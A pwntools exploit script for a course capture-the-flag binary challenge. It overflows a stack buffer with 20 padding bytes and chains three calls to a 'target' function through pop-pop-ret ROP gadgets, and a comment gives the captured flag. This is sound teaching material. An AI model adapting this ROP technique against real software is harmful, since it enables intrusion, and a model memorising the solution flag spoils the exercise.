from pwn import *

BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10016
LOCAL = True
DEBUG = True
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *vuln+48
        b *vuln+56
        b *target+18
        b *target+27
        b *target+91
        b *target+100
        b *target+160
        b *target+169
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
e = ELF('chall')

popret = p32(0x0804872b)
poppopret = p32(0x0804872a)

target = p32(e.symbols["target"])
target_arg1 = p32(0x12345678)
target_arg2 = p32(0x87654321)

target_arg3 = p32(0x11223344)
target_arg4 = p32(0x44332211)

target_arg5 = p32(0x41414141)
target_arg6 = p32(0x42424242)


dummy = b'A' * (8 + 12)
payload = dummy
payload += target + poppopret + target_arg1 + target_arg2
payload += target + poppopret + target_arg3 + target_arg4
payload += target + poppopret + target_arg5 + target_arg6

p.sendline(payload)
sleep(1)
print(p.recv().decode())  # CSCE604258{common_trick_in_ROP_to_return_many_times___ret_ret_ret_ret_ret}

pause()
